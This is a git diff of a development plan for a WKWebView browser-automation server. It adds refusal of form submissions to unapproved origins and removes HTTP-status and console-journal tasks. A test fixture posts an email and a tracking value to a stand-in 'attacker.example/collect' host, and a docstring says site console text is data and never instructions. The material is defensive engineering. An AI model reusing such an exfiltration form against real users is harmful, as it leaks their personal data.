+      approvedOrigin: approvedSubmissionOrigin,
+      submissionURL: formInfo.submissionURL,
+      httpMethod: formInfo.httpMethod)
+  }
+```
+
+`Self.sanitizedOrigin(for:)` already exists — it is used by `recordNavigationAudit`. Add the two new stored properties it references:
+
+```swift
+  /// The origin the human approved for the action in flight, set where the confirmed
+  /// action is dispatched and cleared when the action completes.
+  private var approvedSubmissionOrigin: String?
+  private var pendingSubmissionDecision: SubmissionApproval.Decision?
+```
+
+- [ ] **Step 6: Apply the refusal where refusals live**
+
+In `webView(_:decidePolicyFor navigationAction:)`, before the existing decision returns:
+
+```swift
+    if let decision = pendingSubmissionDecision {
+      pendingSubmissionDecision = nil
+      if case .refuseForeignOrigin = decision {
+        navigationFailure = WebKitRuntimeError.networkBoundaryDenied
+        return .cancel
+      }
+      if case .refuseUnapproved = decision {
+        navigationFailure = WebKitRuntimeError.networkBoundaryDenied
+        return .cancel
       }
     }
-    #expect(offenders.isEmpty, "tracked files contradict the refusal claim: \(offenders)")
-  }
-}
 ```
 
-- [ ] **Step 3: Run the test to verify it fails**
+Read the surrounding method first — it already has a policy-decision structure, and this must slot into it rather than shadow an earlier return:
 
 ```bash
-swift test --arch arm64 --no-parallel --filter noEscapeHatchIsTracked
+grep -n 'decidePolicyFor navigationAction' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
 ```
 
-Expected: FAIL, naming `src/index.ts offers webkitui_cdp_send`.
+- [ ] **Step 7: Write the failing runtime test, gated**
 
-- [ ] **Step 4: Untrack the legacy shim, keeping it on disk**
-
-```bash
-cd ~/GitHub/webkitui-mcp
-git rm --cached -r src
-git rm --cached package.json package-lock.json tsconfig.json
-git rm --cached scripts/goat-test.mjs scripts/goat-test-full.mjs \
-  scripts/goat-test-worker-console.mjs scripts/smoke-test.mjs
-```
-
-Append to `.gitignore`:
-
-```
-# Retained Playwright/CDP prior art. It is not the product: the supported surface is the
-# Swift/WKWebView server, and it deliberately exposes no JavaScript or CDP tool. Keeping
-# these files in the index made the repository contradict that claim in public.
-src/
-package.json
-package-lock.json
-tsconfig.json
-scripts/goat-test*.mjs
-scripts/smoke-test.mjs
-```
-
-- [ ] **Step 5: Run the test to verify it passes**
-
-```bash
-swift test --arch arm64 --no-parallel --filter noEscapeHatchIsTracked
-```
-
-Expected: PASS.
-
-- [ ] **Step 6: Confirm nothing in the Swift build depended on those files**
-
-```bash
-swift build -c release --arch arm64
-xcrun swift-format lint --strict --recursive Sources Tests Package.swift
-```
-
-Expected: `Build complete!` and lint exit 0. `Package.swift` never referenced `src/`, so this is a confirmation, not a fix.
-
-- [ ] **Step 7: Commit**
-
-```bash
-git add .gitignore Tests/WebKitUIMCPServerTests/CapabilityClaimsCoherenceTests.swift
-git commit -F - <<'EOF'
-build: stop the tracked tree contradicting the no-escape-hatch claim
-
-README promises no arbitrary JavaScript and no raw CDP escape hatch, and the
-public repository also tracked a retained Playwright shim registering
-`webkitui_cdp_send`, described in its own text as an escape hatch. package.json
-marked it legacy prior art, which a reader auditing the promise has no reason to
-read first. The files stay on disk and are ignored; a coherence suite fails if a
-tracked JavaScript file ever offers one of those tools again.
-
-History still contains them. Rewriting it is a separate decision and is not done
-here.
-
-Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
-Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
-EOF
-```
-
----
-
-## Task 2: Record the main frame's HTTP status
-
-Every action result says, correctly, that UI state never proves a backend commit. Part of why that stayed unanswerable is that nothing carried a response code at all. The main frame's status arrives through `WKNavigationDelegate`, not from the page, so it is the one network fact this runtime can report without asking a site to describe itself — and it is exactly the evidence a client needs to distinguish "the console rendered an error page" from "the request was accepted".
-
-Subresource and XHR statuses are deliberately **not** added: WKWebView exposes no inspection API for them, and the only route would be patching `fetch`/`XMLHttpRequest` inside the page, which any site can observe and falsify. Apple's Safari MCP gets them from Web Inspector; this product cannot, and says so in Task 5.
-
-**Files:**
-- Create: `Sources/WebKitUIMCPCore/NavigationResponseFacts.swift`
-- Create: `Tests/WebKitUIMCPCoreTests/NavigationResponseFactsTests.swift`
-- Modify: `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift` (struct at line 97, `navigate(to:)` at line ~514, response delegate at line 2052)
-- Test: `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`
-
-**Interfaces:**
-- Consumes: nothing.
-- Produces:
-  - `NavigationResponseFacts.mainFrameHTTPStatus(isForMainFrame: Bool, response: URLResponse?) -> Int?`
-  - `WebKitNavigationResult.mainFrameHTTPStatus: Int?`, defaulted `nil`, therefore surfaced automatically in the `browser_navigate` payload because `MCPServer.swift:2487` encodes the whole result with `requireObject(.encoded(result), …)`.
-
-- [ ] **Step 1: Write the failing unit test**
-
-Create `Tests/WebKitUIMCPCoreTests/NavigationResponseFactsTests.swift`:
+In `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`:
 
 ```swift
-import Foundation
-import Testing
-
-@testable import WebKitUIMCPCore
-
-@Suite("Navigation response facts")
-struct NavigationResponseFactsTests {
-  private func response(_ status: Int) throws -> HTTPURLResponse {
-    let url = try #require(URL(string: "https://fixture.invalid/"))
-    return try #require(
-      HTTPURLResponse(url: url, statusCode: status, httpVersion: "HTTP/1.1", headerFields: nil))
-  }
-
-  @Test("A main-frame HTTP response contributes its status")
-  func mainFrameStatusIsRecorded() throws {
-    #expect(
-      NavigationResponseFacts.mainFrameHTTPStatus(
-        isForMainFrame: true, response: try response(503)) == 503)
-    #expect(
-      NavigationResponseFacts.mainFrameHTTPStatus(
-        isForMainFrame: true, response: try response(200)) == 200)
-  }
-
-  @Test("A subframe response contributes nothing")
-  func subframeStatusIsRefused() throws {
-    // The field is named for the main frame. An iframe's 404 recorded there would be a
-    // lie a client cannot detect.
-    #expect(
-      NavigationResponseFacts.mainFrameHTTPStatus(
-        isForMainFrame: false, response: try response(404)) == nil)
-  }
-
-  @Test("A non-HTTP response contributes nothing")
-  func nonHTTPResponseIsRefused() throws {
-    let url = try #require(URL(string: "about:blank"))
-    let plain = URLResponse(
-      url: url, mimeType: "text/html", expectedContentLength: 0, textEncodingName: nil)
-    #expect(NavigationResponseFacts.mainFrameHTTPStatus(isForMainFrame: true, response: plain) == nil)
-    #expect(NavigationResponseFacts.mainFrameHTTPStatus(isForMainFrame: true, response: nil) == nil)
-  }
-
-  @Test("A status outside the HTTP range contributes nothing")
-  func implausibleStatusIsRefused() throws {
-    #expect(
-      NavigationResponseFacts.mainFrameHTTPStatus(
-        isForMainFrame: true, response: try response(0)) == nil)
-    #expect(
-      NavigationResponseFacts.mainFrameHTTPStatus(
-        isForMainFrame: true, response: try response(999)) == nil)
-  }
-}
-```
-
-- [ ] **Step 2: Run it to verify it fails**
-
-```bash
-swift test --arch arm64 --no-parallel --filter NavigationResponseFactsTests
-```
-
-Expected: FAIL to compile, `cannot find 'NavigationResponseFacts' in scope`.
-
-- [ ] **Step 3: Write the minimal implementation**
-
-Create `Sources/WebKitUIMCPCore/NavigationResponseFacts.swift`:
-
-```swift
-import Foundation
-
-/// Which facts a navigation response is allowed to add to the record.
-///
-/// Action results have always said that UI state never proves a backend commit, and
-/// nothing carried a response code at all, so a client had no way to tell a rendered
-/// error page from an accepted request. The main frame's status comes from the
-/// navigation delegate rather than from the page, so it is the one network fact this
-/// runtime can report without asking a site to describe itself.
-///
-/// Subresource statuses are deliberately absent. WKWebView exposes no inspection API for
-/// them, and patching `fetch` inside the page would report whatever the page chose to
-/// let us see.
-public enum NavigationResponseFacts {
-  /// The status to record, or `nil` when there is nothing trustworthy to record: a
-  /// subframe, a non-HTTP response such as a `loadHTMLString` fixture, or a number
-  /// outside the range a client could branch on.
-  public static func mainFrameHTTPStatus(
-    isForMainFrame: Bool,
-    response: URLResponse?
-  ) -> Int? {
-    guard isForMainFrame, let http = response as? HTTPURLResponse else { return nil }
-    guard (100...599).contains(http.statusCode) else { return nil }
-    return http.statusCode
-  }
-}
-```
-
-- [ ] **Step 4: Run it to verify it passes**
-
-```bash
-swift test --arch arm64 --no-parallel --filter NavigationResponseFactsTests
-```
-
-Expected: PASS, 4 tests.
-
-- [ ] **Step 5: Write the failing runtime test**
-
-In `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`, insert immediately before the line `  @Test("Session handles are bounded and unforgeable")`:
-
-```swift
-  @Test("A local fixture reports no main-frame HTTP status rather than inventing one")
-  func fixtureLoadReportsNoHTTPStatus() async throws {
-    // loadHTML has no HTTP response. Reporting 200 here would be the most convenient
-    // lie available, so the field has to stay absent.
-    let runtime = WebKitRuntime()
-    let result = try await runtime.loadHTML(
-      "<!doctype html><title>Fixture</title><p>Fixture</p>",
-      baseURL: URL(string: "https://fixture.invalid/"),
-      timeout: fixtureNavigationTimeout,
-      quietWindow: .milliseconds(40))
-
-    #expect(result.mainFrameHTTPStatus == nil)
-  }
-
-```
-
-- [ ] **Step 6: Run it to verify it fails**
-
-```bash
-swift test --arch arm64 --no-parallel --filter fixtureLoadReportsNoHTTPStatus
-```
-
-Expected: FAIL to compile, `value of type 'WebKitNavigationResult' has no member 'mainFrameHTTPStatus'`.
-
-- [ ] **Step 7: Add the field to the result**
-
-In `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift`, inside `public struct WebKitNavigationResult` (line 97), after `public let mutationCount: UInt64`:
-
-```swift
-  /// The main frame's HTTP status, from the navigation delegate rather than the page.
-  /// Absent for a `loadHTMLString` fixture, a non-HTTP response, or a subframe. A
-  /// default keeps every existing construction site compiling; only a real navigation
-  /// fills it in.
-  public var mainFrameHTTPStatus: Int?
-```
-
-Declare it `var` with no explicit value so it defaults to `nil` in the memberwise initializer. Do not add `CodingKeys`: nothing in `Sources` sets a key-encoding strategy, so the JSON key is the property name, matching the existing `documentID` and `requestedURL` keys.
-
-- [ ] **Step 8: Run it to verify it passes**
-
-```bash
-swift test --arch arm64 --no-parallel --filter fixtureLoadReportsNoHTTPStatus
-```
-
-Expected: PASS.
-
-- [ ] **Step 9: Record the status in the response delegate**
-
-Add the storage next to the other per-navigation state. In `WebKitRuntime`, after `private var navigationAuditEvents: [WebKitNavigationAuditEvent] = []`:
-
-```swift
-  /// Cleared at the start of every navigation so a previous page's status can never
-  /// attach to the next one.
-  private var latestMainFrameHTTPStatus: Int?
-```
-
-In `public func navigate(to url: URL, …)`, directly after the existing line `pendingCrossOriginNavigationRequest = nil`:
-
-```swift
-    latestMainFrameHTTPStatus = nil
-```
-
-In `public func webView(_:decidePolicyFor navigationResponse:)` (line 2052), insert **before** the existing `guard downloadContinuation != nil else { return .allow }` — the guard returns early for every ordinary navigation, which is why nothing was recorded until now:
-
-```swift
-    if let status = NavigationResponseFacts.mainFrameHTTPStatus(
-      isForMainFrame: navigationResponse.isForMainFrame,
-      response: navigationResponse.response)
-    {
-      latestMainFrameHTTPStatus = status
-    }
-```
-
-`WebKitUIMCPRuntime` already depends on `WebKitUIMCPCore` in `Package.swift`; add `import WebKitUIMCPCore` only if the file does not already have it:
-
-```bash
-grep -n '^import WebKitUIMCPCore' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
-```
-
-- [ ] **Step 10: Attach it where a real navigation builds its result**
-
-```bash
-grep -n 'WebKitNavigationResult(' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
-```
-
-For each construction site reached by `navigate(to:)` — not the `loadHTML` fixture path, which must keep reporting `nil` — add the argument:
-
-```swift
-      mainFrameHTTPStatus: latestMainFrameHTTPStatus,
-```
-
-Place it after `mutationCount:`. If a single helper builds the result for both paths, leave the helper alone and instead set the field on the returned value inside `navigate(to:)`:
-
-```swift
-    var result = /* existing expression */
-    result.mainFrameHTTPStatus = latestMainFrameHTTPStatus
-    return result
-```
-
-- [ ] **Step 11: Verify the whole runtime bundle and lint**
-
-```bash
-xcrun swift-format lint --strict --recursive Sources Tests Package.swift
-swift test --arch arm64 --no-parallel --filter '^WebKitUIMCPRuntimeTests\.'
-swift test --arch arm64 --no-parallel --filter '^WebKitUIMCPCoreTests\.'
-```
-
-Expected: lint exit 0; `Test run with 142 tests` for the runtime bundle and a passing core bundle, both printing their summary line.
-
-- [ ] **Step 12: Commit**
-
-```bash
-git add Sources/WebKitUIMCPCore/NavigationResponseFacts.swift \
-  Tests/WebKitUIMCPCoreTests/NavigationResponseFactsTests.swift \
-  Sources/WebKitUIMCPRuntime/WebKitRuntime.swift \
-  Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift
-git commit -F - <<'EOF'
-feat: report the main frame's HTTP status, from the delegate and never from the page
-
-Action results say UI state never proves a backend commit, and nothing carried a
-response code, so a client could not tell a rendered error page from an accepted
-request. The main frame's status now travels on the navigation result. It comes
-from the navigation delegate, so a site cannot author it; a fixture load, a
-non-HTTP response and a subframe all report nothing rather than the convenient
-200.
-
-Subresource statuses are still absent on purpose: WKWebView offers no inspection
-API for them, and patching fetch inside the page would report whatever the page
-allowed us to see.
-
-Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
-Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
-EOF
-```
-
----
-
-## Task 3: Capture the console as untrusted site content
-
-When an approved click dispatches, is measured as a trusted gesture, and the page still does nothing, the reason is usually in the console. The product currently offers no way to see it, so the operator's only recourse is a human handoff. Apple's server exposes console access; this one can too, with the difference that the lines must be labelled for what they are — text authored by the site, never instructions, exactly like the existing untrusted-label treatment of DOM text.
-
-**Files:**
-- Create: `Sources/WebKitUIMCPCore/ConsoleJournal.swift`
-- Create: `Tests/WebKitUIMCPCoreTests/ConsoleJournalTests.swift`
-- Modify: `Sources/WebKitUIMCPRuntime/WebKitRuntime.swift` (handler name at line 4762, registration at line 507, `userContentController(_:didReceive:)` at line 1478, instrumentation script)
-- Test: `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`
-
-**Interfaces:**
-- Consumes: nothing.
-- Produces:
-  - `ConsoleJournal.Line(level: ConsoleJournal.Level, text: String, monotonicNanoseconds: UInt64)`
-  - `ConsoleJournal.maximumLines: Int` = 200, `ConsoleJournal.maximumCharactersPerLine: Int` = 2_000
-  - `mutating func record(level:text:monotonicNanoseconds:)`, `var lines: [Line]`, `var droppedLines: Int`
-  - `WebKitRuntime.consoleJournalSnapshot() -> [ConsoleJournal.Line]` and `WebKitRuntime.consoleDroppedLineCount() -> Int`
-
-- [ ] **Step 1: Write the failing unit test**
-
-Create `Tests/WebKitUIMCPCoreTests/ConsoleJournalTests.swift`:
-
-```swift
-import Foundation
-import Testing
-
-@testable import WebKitUIMCPCore
-
-@Suite("Console journal")
-struct ConsoleJournalTests {
-  @Test("Lines are kept in order with their level")
-  func linesAreKept() {
-    var journal = ConsoleJournal()
-    journal.record(level: .log, text: "first", monotonicNanoseconds: 1)
-    journal.record(level: .error, text: "second", monotonicNanoseconds: 2)
-
-    #expect(journal.lines.map(\.text) == ["first", "second"])
-    #expect(journal.lines.map(\.level) == [.log, .error])
-    #expect(journal.droppedLines == 0)
-  }
-
-  @Test("A single line cannot spend the whole budget")
-  func longLineIsTruncated() {
-    var journal = ConsoleJournal()
-    journal.record(
-      level: .warn, text: String(repeating: "x", count: 10_000), monotonicNanoseconds: 1)
-
-    let line = journal.lines[0]
-    #expect(line.text.count == ConsoleJournal.maximumCharactersPerLine)
-    #expect(line.truncated)
-  }
-
-  @Test("A chatty page evicts its oldest lines and says how many it lost")
-  func oldestLinesAreEvicted() {
-    var journal = ConsoleJournal()
-    for index in 0..<(ConsoleJournal.maximumLines + 25) {
-      journal.record(level: .log, text: "line \(index)", monotonicNanoseconds: UInt64(index))
-    }
-
-    #expect(journal.lines.count == ConsoleJournal.maximumLines)
-    #expect(journal.droppedLines == 25)
-    // The newest lines are the ones worth keeping: the failure just happened.
-    #expect(journal.lines.last?.text == "line \(ConsoleJournal.maximumLines + 24)")
-    #expect(journal.lines.first?.text == "line 25")
-  }
-
-  @Test("Clearing on navigation leaves no line from the previous document")
-  func clearingResetsEverything() {
-    var journal = ConsoleJournal()
-    journal.record(level: .error, text: "old document", monotonicNanoseconds: 1)
-    journal.removeAll()
-
-    #expect(journal.lines.isEmpty)
-    #expect(journal.droppedLines == 0)
-  }
-}
-```
-
-- [ ] **Step 2: Run it to verify it fails**
-
-```bash
-swift test --arch arm64 --no-parallel --filter ConsoleJournalTests
-```
-
-Expected: FAIL to compile, `cannot find 'ConsoleJournal' in scope`.
-
-- [ ] **Step 3: Write the minimal implementation**
-
-Create `Sources/WebKitUIMCPCore/ConsoleJournal.swift`:
-
-```swift
-import Foundation
-
-/// Console output from the page under automation.
-///
-/// When an approved click is dispatched, measured as a trusted gesture, and the page
-/// still does nothing, the reason is usually here. Every line is authored by the site,
-/// so it is data and never an instruction, and it is bounded: a page that logs in a loop
-/// must not be able to spend a client's whole context.
-public struct ConsoleJournal: Codable, Equatable, Sendable {
-  public enum Level: String, Codable, Equatable, Sendable {
-    case log
-    case info
-    case warn
-    case error
-    /// An exception that reached `window.onerror`, which is the interesting case.
-    case uncaught
-  }
-
-  public struct Line: Codable, Equatable, Sendable {
-    public let level: Level
-    public let text: String
-    public let truncated: Bool
-    public let monotonicNanoseconds: UInt64
-  }
-
-  public static let maximumLines = 200
-  public static let maximumCharactersPerLine = 2_000
-
-  public private(set) var lines: [Line] = []
-  /// How many lines were evicted, so a client is told the record is partial rather than
-  /// left to assume it is complete.
-  public private(set) var droppedLines = 0
-
-  public init() {}
-
-  public mutating func record(level: Level, text: String, monotonicNanoseconds: UInt64) {
-    let truncated = text.count > Self.maximumCharactersPerLine
-    let bounded = truncated ? String(text.prefix(Self.maximumCharactersPerLine)) : text
-    lines.append(
-      Line(
-        level: level, text: bounded, truncated: truncated,
-        monotonicNanoseconds: monotonicNanoseconds))
-    if lines.count > Self.maximumLines {
-      let excess = lines.count - Self.maximumLines
-      lines.removeFirst(excess)
-      droppedLines += excess
-    }
-  }
-
-  public mutating func removeAll() {
-    lines.removeAll(keepingCapacity: true)
-    droppedLines = 0
-  }
-}
-```
-
-- [ ] **Step 4: Run it to verify it passes**
-
-```bash
-swift test --arch arm64 --no-parallel --filter ConsoleJournalTests
-```
-
-Expected: PASS, 4 tests.
-
-- [ ] **Step 5: Write the failing runtime test**
-
-In `Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift`, insert immediately before `  @Test("Session handles are bounded and unforgeable")`:
-
-```swift
-  @Test("The console and an uncaught exception reach the journal as site-authored data")
-  func consoleOutputIsJournalled() async throws {
+  @available(macOS 27, *)
+  @Test("A form that submits to another origin is refused, and its field names are kept")
+  func foreignFormSubmissionIsRefused() async throws {
+    // WebKit's own account of what is being sent, which the page cannot author. Only
+    // classic form submissions reach this hook: a single-page application that
+    // intercepts submit and posts with fetch does not, and this must never be described
+    // as covering that.
     let runtime = WebKitRuntime()
     _ = try await runtime.loadHTML(
       """
-      <!doctype html><title>Console fixture</title>
-      <script>
-        console.log('hello from the page');
-        console.error('deliberate failure');
-        setTimeout(() => { throw new Error('uncaught fixture'); }, 0);
-      </script>
+      <form action="https://attacker.example/collect" method="post">
+        <input name="tracking" value="1471">
+        <input name="email" value="someone@example.test">
+        <button type="submit">Show tracking number</button>
+      </form>
       """,
-      baseURL: URL(string: "https://fixture.invalid/"),
-      timeout: fixtureNavigationTimeout,
-      quietWindow: .milliseconds(40))
-
-    for _ in 0..<fixtureSettlementPolls
-    where !runtime.consoleJournalSnapshot().contains(where: { $0.level == .uncaught }) {
-      try await Task.sleep(for: .milliseconds(20))
-    }
-    let lines = runtime.consoleJournalSnapshot()
-
-    #expect(lines.contains { $0.level == .log && $0.text.contains("hello from the page") })
-    #expect(lines.contains { $0.level == .error && $0.text.contains("deliberate failure") })
-    #expect(lines.contains { $0.level == .uncaught && $0.text.contains("uncaught fixture") })
-    #expect(runtime.consoleDroppedLineCount() == 0)
-  }
-
-  @Test("A new document starts with an empty console record")
-  func consoleIsClearedOnNavigation() async throws {
-    let runtime = WebKitRuntime()
-    _ = try await runtime.loadHTML(
-      "<!doctype html><script>console.log('first document')</script>",
-      baseURL: URL(string: "https://fixture.invalid/one"),
-      timeout: fixtureNavigationTimeout, quietWindow: .milliseconds(40))
-    for _ in 0..<fixtureSettlementPolls where runtime.consoleJournalSnapshot().isEmpty {
-      try await Task.sleep(for: .milliseconds(20))
-    }
-    #expect(!runtime.consoleJournalSnapshot().isEmpty)
-
-    _ = try await runtime.loadHTML(
-      "<!doctype html><p>second document</p>",
-      baseURL: URL(string: "https://fixture.invalid/two"),
+      baseURL: URL(string: "https://shop.example/orders/1471"),
       timeout: fixtureNavigationTimeout, quietWindow: .milliseconds(40))
 
-    #expect(
-      runtime.consoleJournalSnapshot().allSatisfy { !$0.text.contains("first document") },
-      "a line from the previous document survived the navigation")
+    _ = try await runtime.webView.evaluateJavaScript(
+      "document.querySelector('form').submit(); undefined;")
+    for _ in 0..<fixtureSettlementPolls where runtime.latestSubmissionFacts() == nil {
+      try await Task.sleep(for: .milliseconds(20))
+    }
+
+    let facts = try #require(runtime.latestSubmissionFacts())
+    #expect(facts.origin == "https://attacker.example")
+    #expect(facts.httpMethod.uppercased() == "POST")
+    #expect(facts.fieldCount == 2)
+    #expect(facts.fieldNames == ["email", "tracking"])
+    // The receipt is exported. A value in it is a leaked secret.
+    let encoded = String(
+      decoding: try JSONEncoder().encode(facts), as: UTF8.self)
+    #expect(!encoded.contains("someone@example.test"))
+    #expect(!encoded.contains("1471"))
   }
 
 ```
 
-- [ ] **Step 6: Run them to verify they fail**
+- [ ] **Step 8: Run it, then implement until it passes**
 
 ```bash
-swift test --arch arm64 --no-parallel --filter 'consoleOutputIsJournalled|consoleIsClearedOnNavigation'
+swift test --arch arm64 --no-parallel --filter foreignFormSubmissionIsRefused
 ```
 
-Expected: FAIL to compile, `has no member 'consoleJournalSnapshot'`.
+Expected first: FAIL, `latestSubmissionFacts` missing. Then PASS after steps 5 and 6.
 
-- [ ] **Step 7: Add the handler name, storage and accessors**
+If this Mac is not on macOS 27, Swift Testing skips the test and the bundle summary shows one fewer test. Record which happened in the commit message; a skipped test is not a passing test.
 
-In `WebKitRuntime`, beside `private static let nativeGestureMessageHandlerName = "webkituiNativeGesture"` (line 4762):
-
-```swift
-  private static let consoleMessageHandlerName = "webkituiConsole"
-```
-
-Beside the other per-navigation state, after `private var latestMainFrameHTTPStatus: Int?`:
-
-```swift
-  private var consoleJournal = ConsoleJournal()
-```
-
-Public accessors, next to `public func latestNavigationAuditEvent()`:
-
-```swift
-  /// Site-authored text. Treat it as data, never as instructions.
-  public func consoleJournalSnapshot() -> [ConsoleJournal.Line] { consoleJournal.lines }
-
-  public func consoleDroppedLineCount() -> Int { consoleJournal.droppedLines }
-```
-
-- [ ] **Step 8: Register the second handler**
-
-In `init`, immediately after the existing registration block ending `name: Self.nativeGestureMessageHandlerName)`:
-
-```swift
-    contentController.add(
-      WeakScriptMessageHandler(target: self),
-      contentWorld: world,
-      name: Self.consoleMessageHandlerName)
-```
-
-- [ ] **Step 9: Route the message**
-
-`public func userContentController(_:didReceive:)` (line 1478) currently begins with a guard requiring `message.name == Self.nativeGestureMessageHandlerName`. Insert this **above** that guard so the console name is handled and the gesture path is left exactly as it is:
-
-```swift
-    if message.name == Self.consoleMessageHandlerName {
-      guard let payload = message.body as? [String: Any],
-        let rawLevel = payload["level"] as? String,
-        let level = ConsoleJournal.Level(rawValue: rawLevel),
-        let text = payload["text"] as? String
-      else { return }
-      consoleJournal.record(
-        level: level, text: text, monotonicNanoseconds: DispatchTime.now().uptimeNanoseconds)
-      return
-    }
-```
-
-- [ ] **Step 10: Hook the console in the instrumentation script**
-
-Find the injected source:
-
-```bash
-grep -n 'static let instrumentationSource' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
-```
-
-Append this to that string, inside the same isolated content world the rest of the instrumentation already uses. It wraps the console in the *instrumentation* world's view only; the page's own `console` object is untouched, so a site cannot detect the wrapper by comparing `console.log.toString()` in its own world:
-
-```javascript
-    // Console output is the usual explanation for an approved, trusted click that
-    // changed nothing. It is site-authored text, bounded and labelled on the Swift side.
-    const forwardConsole = (level, args) => {
-      try {
-        const text = Array.from(args).map(value => {
-          if (typeof value === 'string') return value;
-          try { return JSON.stringify(value); } catch (error) { return String(value); }
-        }).join(' ');
-        window.webkit.messageHandlers.webkituiConsole.postMessage({ level, text });
-      } catch (error) { /* a page that removed the bridge simply gets no journal */ }
-    };
-    for (const level of ['log', 'info', 'warn', 'error']) {
-      const original = console[level];
-      console[level] = function (...args) {
-        forwardConsole(level, args);
-        return original.apply(console, args);
-      };
-    }
-    window.addEventListener('error', event => {
-      forwardConsole('uncaught', [event.message || String(event.error)]);
-    });
-    window.addEventListener('unhandledrejection', event => {
-      forwardConsole('uncaught', ['unhandled rejection: ' + String(event.reason)]);
-    });
-```
-
-- [ ] **Step 11: Clear the journal on a new document**
-
-Find where the document identity is regenerated:
-
-```bash
-grep -n 'documentID = UUID().uuidString' Sources/WebKitUIMCPRuntime/WebKitRuntime.swift
-```
-
-At each site that marks a *new* document (not the initial property declaration at line ~384), add:
-
-```swift
-    consoleJournal.removeAll()
-```
-
-- [ ] **Step 12: Run the tests to verify they pass**
-
-```bash
-swift test --arch arm64 --no-parallel --filter 'consoleOutputIsJournalled|consoleIsClearedOnNavigation'
-```
-
-Expected: PASS, 2 tests. If the uncaught line never arrives, confirm the fixture's `setTimeout` throw reaches `window.onerror` by checking the `log` line arrived first — a missing `log` line means the bridge name is wrong, not that the error hook is.
-
-- [ ] **Step 13: Expose it on the MCP surface**
-
-`browser_observe` builds its payload at `Sources/WebKitUIMCPServer/MCPServer.swift:570` with `var observed = try requireObject(.encoded(observation), named: "browser observation")`. Add the console beside it, following the pattern of the manually-added `structured["redirected"]` at line 2488:
-
-```swift
-        if !runtime.consoleJournalSnapshot().isEmpty {
-          observed["console"] = .object([
-            "provenance": .string("untrusted_site_content"),
-            "dropped_lines": .int(runtime.consoleDroppedLineCount()),
-            "lines": try requireArray(
-              .encoded(runtime.consoleJournalSnapshot()), named: "console lines"),
-          ])
-        }
-```
-
-Confirm the array helper's real name before writing it:
-
-```bash
-grep -n 'func requireArray\|func requireObject' Sources/WebKitUIMCPServer/*.swift
-```
-
-If no array helper exists, encode the whole journal as one object instead:
-
-```swift
-          observed["console"] = try requireObject(
-            .encoded(runtime.consoleJournalForExport()), named: "console journal")
-```
-
-and add to `WebKitRuntime`:
-
-```swift
-  /// The journal as one encodable value, for a client that wants the drop count and the
-  /// lines together.
-  public func consoleJournalForExport() -> ConsoleJournal { consoleJournal }
-```
-
-- [ ] **Step 14: Verify the server bundle and lint**
+- [ ] **Step 9: Full suite, lint, commit**
 
 ```bash
 xcrun swift-format lint --strict --recursive Sources Tests Package.swift
-swift test --arch arm64 --no-parallel --filter '^WebKitUIMCPServerTests\.'
-swift test --arch arm64 --no-parallel --filter '^WebKitUIMCPRuntimeTests\.'
+swift test --arch arm64 --no-parallel --skip hostExclusiveSession
+sw_vers -productVersion
 ```
 
-Expected: lint exit 0, both bundles printing their `Test run with` summary and passing.
-
-- [ ] **Step 15: Commit**
-
 ```bash
-git add Sources/WebKitUIMCPCore/ConsoleJournal.swift \
-  Tests/WebKitUIMCPCoreTests/ConsoleJournalTests.swift \
+git add Sources/WebKitUIMCPCore/SubmissionApproval.swift \
+  Tests/WebKitUIMCPCoreTests/SubmissionApprovalTests.swift \
   Sources/WebKitUIMCPRuntime/WebKitRuntime.swift \
-  Sources/WebKitUIMCPServer/MCPServer.swift \
   Tests/WebKitUIMCPRuntimeTests/WebKitRuntimeTests.swift
 git commit -F - <<'EOF'
-feat: journal the console, bounded and labelled as site-authored data
+feat: refuse a form submission that leaves the origin the human approved
 
-An approved click that dispatches, measures as a trusted gesture, and changes
-nothing usually explains itself in the console, and there was no way to look.
-console.log/info/warn/error, window.onerror and unhandled rejections are now
-recorded in the instrumentation world, capped at 200 lines and 2000 characters
-each with an explicit dropped-line count, cleared on every new document, and
-exposed under a provenance label of untrusted_site_content.
+Task 1 shows the destination the DOM claims. This is WebKit's own account of what
+is actually being sent, through WKFormInfo on macOS 27, which is the one
+description of a submission a page cannot author.
 
-The page's own console object is untouched, so a site cannot detect the wrapper
-by inspecting its own world.
+submissionHandler is a delay and not a veto — the header says it only indicates
+the submission may continue — so the refusal is applied in the navigation policy
+handler, which is where every other refusal in this runtime already lives. A
+submission with no approval on record is refused too, because a form submitting
+with nothing approved is a case an attacker constructs.
+
+The receipt carries origin, method, field count and field names. Values are
+excluded by construction: a form carries passwords, card numbers and one-time
+codes, and this receipt is exported. A test asserts the encoded receipt contains
+neither fixture value.
+
+Only classic form submissions reach this hook. A single-page application that
+intercepts submit and posts with fetch does not, and nothing here claims
+otherwise. Feature-gated to macOS 27 against the macOS 15 floor.
+
+Evidence: docs/research/2026-09-09-wkwebview-capability-ceiling.md.
 
 Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
 Claude-Session: https://claude.ai/code/session_019VwrQsCEcmT25v1DJUfJMw
@@ -887,153 +726,219 @@ EOF
 
 ---
 
-## Task 4: Say which hosts the boundary actually allowed and blocked
+## Task 3: Make dialog fatigue cost the attacker something
 
-`docs/network-boundary.md` promises the session's egress goes through one pinned loopback SOCKS proxy that refuses non-public resolutions. The proxy already counts accepted, blocked, pinned and timed-out connections, but never says *which* hosts, so the promise is auditable only in aggregate. Recording the distinct hosts, bounded, turns the strongest architectural claim into evidence a client can read back.
